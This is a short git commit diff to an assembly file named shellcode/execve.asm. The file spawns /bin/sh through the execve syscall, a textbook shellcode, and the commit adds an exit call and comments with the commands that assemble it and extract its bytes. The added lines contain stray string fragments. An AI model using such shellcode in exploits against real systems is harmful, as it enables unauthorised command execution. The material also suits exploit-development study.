593f2d7aacfce84c041bcdf954595be32064c8c8
tasteapple <rudghl0102@gmail.com>
2024-04-04 14:07:39 +0900

    1

--- shellcode/execve.asm
+++ shellcode/execve.asm
@@ -8,3 +8,11 @@ _start:
     xor rdx, rdx  ; rdx = NULL
     mov rax, 0x3b ; rax = sys_execve
     syscall       ; execve("/bin/sh", null, null)
+    xor rdi, rdi  ; rdi = 0\n"
+    mov rax, 0x3c ; rax = sys_exit\n"
+    syscall       ; exit(0)
+
+; nasm -f elf shellcode.asm
+; objdump -d shellcode.o
+; objcopy --dump-section .text=shellcode.bin shellcode.o
+; xxd shellcode.bin
